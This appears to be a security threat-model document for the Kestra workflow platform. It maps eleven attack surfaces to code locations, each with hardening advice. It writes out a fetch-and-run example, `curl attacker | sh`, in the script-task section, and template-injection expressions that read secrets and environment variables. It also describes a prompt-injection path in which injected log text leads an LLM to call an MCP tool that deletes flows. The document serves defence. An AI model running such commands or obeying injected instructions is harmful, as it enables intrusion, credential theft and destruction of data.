# 03 — Attack Surfaces in Terms of Security

> Read this as: every place an attacker (outsider, malicious insider, or compromised dependency) can touch the system. Proofs are class/file names you can open in this repo.

## 0. The one rule

**Flow-write = code execution.** Anyone who can create or edit a Flow YAML can run code on workers (Python, Shell, Docker, K8s). Every other control — auth, tenants, secrets — exists to gate who gets that power and what that code can reach.

Worker proof: `worker/src/main/java/io/kestra/worker/WorkerSecurityService.java:11` is just `callable.call()` — no sandbox. Isolation must come from deployment (Docker/K8s/task-runner), not from Java.

## A1. Public REST API + Web UI (authenticated, but broad)

- **Where:** `webserver/src/main/java/io/kestra/webserver/controllers/api/` — 28 `@Controller`s: `FlowController (/flows)`, `ExecutionController (/executions)`, `TriggerController`, `SecretController`, `NamespaceSecretController`, `KVController`, `NamespaceFileController`, `PluginController (/plugins/)`, `ExpressionController (/expressions)`, `DashboardController`, `BlueprintController`, `AiController (/main/ai)`, `AiAgentController`, `McpServerController`, `McpToolController`, `MiscController`, `LogController`, `MetricController`, `TenantController`, `ConcurrencyLimitController`, `ClusterController`, `UiController`, `OutputController`.
- **Auth in OSS:** `webserver/.../services/BasicAuthService.java` (single username/password + cookie `BASIC_AUTH_COOKIE_NAME`) + `webserver/.../filter/AuthenticationFilter.java` + `CsrfTokenFilter.java`. RBAC/OIDC/SSO/audit are EE-only — OSS self-hosts are often single-password or accidentally open.
- **How attacked:** stolen cookie/password, CSRF on browser sessions, IDOR by swapping `{tenant}/{namespace}/{flowId}/{executionId}`, mass delete/replace via bulk endpoints, log/output scraping for secrets, SSE streaming (`ExecutionStreamingService`, `SseConnectionMetrics`) for enumeration.
- **Harden:** put SSO/OAuth proxy in front, least-privilege namespaces/tenants, audit flow-write separately from flow-run, set `MAX_PAGE_SIZE` / rate limits, strip secrets from logs.

## A2. Webhook triggers (unauthenticated by design — highest exposure)

- **Where:** `ExecutionController.java:568-653` — five routes, all `@AnonymousAccess`: `POST /webhook/{namespace}/{id}/{key}`, `POST` multipart variant, `PUT` multipart variant, `GET /webhook/...`, `PUT /webhook/...`. Logic in `core/.../services/WebhookService.java:133 newExecution` + `:213 startExecution`, multipart stored by `webserver/.../services/WebhookBodyService.java`.
- **How attacked:** anyone with the URL (namespace + flow id + secret `key`) can fire executions forever → cost/DoS, poison `trigger.body/uri/parts/formFields` with malicious payloads, upload files that land in internal storage (`trigger.parts` URIs), probe `conditions` to oracle internal state (204 vs 200 vs render-error).
- **Harden:** long random `key` per trigger, rotate on leak, add HMAC/secret-header check in flow `conditions`, throttle + concurrency limits + `disabled: true` kill-switch, validate + size-cap `body/parts`, purge test-event files (`deleteStoredFiles`).

## A3. Pebble expression rendering (SSTI target)

- **Where:** `core/src/main/java/io/kestra/core/utils/PebbleUtil.java` (both `{{ }}` and `{% %}` delimiters), `core/.../runners/VariableRenderer.java`, `DefaultRunContext.render()`, preview endpoint `ExpressionController.java:60-74 /expressions/render`.
- **How attacked:** `{{ secret('X') }}`, `{{ env('AWS_SECRET') }}` exfiltration, calling unsafe functions/filters, accessing `flow/execution/trigger` objects beyond need-to-know. The `/render` endpoint is deliberately restricted (`secret()` masked as `[secret: KEY]`, allowlist of pure functions, all-or-nothing per expression) — exactly because generic rendering would be SSTI-as-a-service.
- **Harden:** never hand-roll `{{` checks — use `PebbleUtil` (per `AGENTS.md`), keep `DisplayExpressionRenderer` allowlist tight, block `secret()/env()` in display paths, size-cap `expressions` list (already `@Size(max=500)`).

## A4. Plugin system (supply chain + deserialization)

- **Where:** `webserver/.../controllers/api/PluginController.java` (841 lines), `core/.../plugins/PluginRegistry.java`, `PluginAutoInstallService.java`, `PluginInstallJob.java`, `core/.../docs/JsonSchemaGenerator.java`.
- **How attacked:** typosquat/malicious plugin JAR = full JVM RCE on server + workers, auto-install pulls new code at runtime, old/vulnerable plugin versions, malicious icon/docs/JSON-schema served to UI (stored XSS via plugin metadata), `EeOnly` bypass attempts.
- **Harden:** pin plugin versions + checksums, private mirror, disable auto-install in prod, review custom plugins like any prod dependency, serve icons with immutable cache + CSP.

## A5. Script tasks + task runners (container escape)

- **Where:** `model/`, `processor/`, `script/` modules + Docker/K8s runners. Quickstart in `README.md:97-103` mounts `-v /var/run/docker.sock:/var/run/docker.sock` and `-v /tmp:/tmp --user=root`.
- **How attacked:** `python/shell/node` task runs `os.system("curl attacker | sh")`, Docker task with `docker.sock` escapes to host root, K8s task steals ServiceAccount token, `workingDir` traversal into sibling executions.
- **Harden:** never mount `docker.sock` in prod, run workers as non-root with gVisor/Kata or least-privileged K8s SA, per-tenant worker pools (like Acxiom's per-client EKS pools), egress allowlist, no privileged containers, scrub `env()` from outputs.

## A6. Secrets, KV, namespace files, internal storage (lateral movement)

- **Where:** `SecretController`, `NamespaceSecretController`, `KVController`, `NamespaceFileController`, `OutputController`, `core/.../storages/StorageInterface.java`, `StorageContext.java`, `Namespace.java`, `core/.../secret/SecretService.java`, `SecretPluginInterface.java`.
- **How attacked:** `secret()` in a log line leaks to `LogController`/UI, KV used as covert channel between executions, namespace-file read/write outside own prefix (traversal), `outputs` exfiltrate S3/GCS/Vault creds, cross-tenant read by guessing `tenant/namespace/key`.
- **Harden:** Vault/AWS-SM/GCP-SM backend (not plaintext), namespace-scoped secrets only, mask secrets in `ExecutionLogService` + `FileRendererService`, enforce tenant isolation end-to-end (DB row + storage prefix + queue routing), presigned-short-lived storage URLs.

## A7. Scheduler + polling/realtime triggers (SSRF + credential store)

- **Where:** `scheduler/.../DefaultScheduler.java`, `TriggerSchedulingLoop.java`, `SchedulableEvaluator.java`, `core/.../models/triggers/PollingTriggerInterface.java`, `RealtimeTriggerInterface.java`, `worker/.../processors/WorkerTriggerProcessor.java`.
- **How attacked:** trigger config holds Kafka/SQS/SQL/S3 passwords → leaked via Flow GET API; polling URL pointed at `169.254.169.254` (cloud metadata) or internal DB; cron `* * * * *` + backfill = accidental DoS; realtime subscription never closes = resource leak.
- **Harden:** secrets for triggers only (never inline passwords), egress proxy + metadata-IP block, validate cron + backfill windows, alert on trigger-failure storms.

## A8. Persistence + internal queue (injection + DoS)

- **Where:** `jdbc/`, `jdbc-h2/mysql/postgres/`, `queue/`, `queue-jdbc/`, `ExecutionRepositoryInterface`, `FlowRepositoryInterface`, `QueryFilter`, `PageableUtils.MAX_PAGE_SIZE`.
- **How attacked:** filter/sort injection via `?filters=` JSON, giant inputs/outputs → `MessageTooBigException` (mapped to 413 in `ErrorController`), queue poisoning stalls `DefaultExecutor`, H2 file theft in `local` mode gives full DB.
- **Harden:** Postgres/MySQL with least-privilege user + TLS in prod, validate `QueryFilter`, cap input/output/file sizes, monitor queue lag + `SLAMonitorStateStore`.

## A9. Worker control plane / gRPC (impersonation)

- **Where:** `worker-controller/`, `worker/.../services/GrpcWorkerConnectionService.java`, `senders/GrpcWorkerIOSender.java`, `queues/WorkerQueue.java`, `stores/GrpcWorker*StateStore.java`.
- **How attacked:** rogue worker joins pool and receives jobs containing secrets + code, replay/forged `WorkerTaskResult` to fake SUCCESS, sniff gRPC for inputs.
- **Harden:** mTLS + token for workers, private subnet for control plane, per-pool queues (`WorkerQueueRouting`), sign results, alert on unknown worker IDs.

## A10. AI + MCP + Blueprints (prompt injection + malicious import)

- **Where:** `AiController (/main/ai)`, `AiAgentController (/ai/threads)`, `McpServerController (/mcp-servers)`, `McpToolController (/mcp)`, `BlueprintController`, `PluginController` schema/docs endpoints.
- **How attacked:** attacker-controlled log/flow text fed to LLM → prompt injection → LLM calls MCP tool to delete flows; poisoned community Blueprint imported as Flow = instant #A3 code exec.
- **Harden:** treat LLM output as untrusted (confirm before apply), scope MCP tools to read-only by default, review every Blueprint/Terraform/Git import like a PR.

## A11. CLI + local mode + observability (ops leak)

- **Where:** `cli/.../commands/servers/LocalCommand.java`, `StandAloneRunner.java`, `FlowFilesManager.java`, `sys/*`, `plugins/*`, `migrations/*`; `MiscController (/api/v1/configs, /version)`, `MetricController`, `LogController`, `ClusterController`.
- **How attacked:** `server local --user=root` + docker.sock = host takeover on stolen laptop; `flow export/test/dot`, `kv update`, `plugin install` abused on shared host; `/configs` + stack traces + metrics leak versions/paths for targeted CVE exploit.
- **Harden:** never run `local` with prod secrets, pin `cli` version to server, redact `/configs`, structured JSON logs without secrets (`StackdriverJsonLayout`), `SECURITY.md:15 security@kestra.io` for reports.
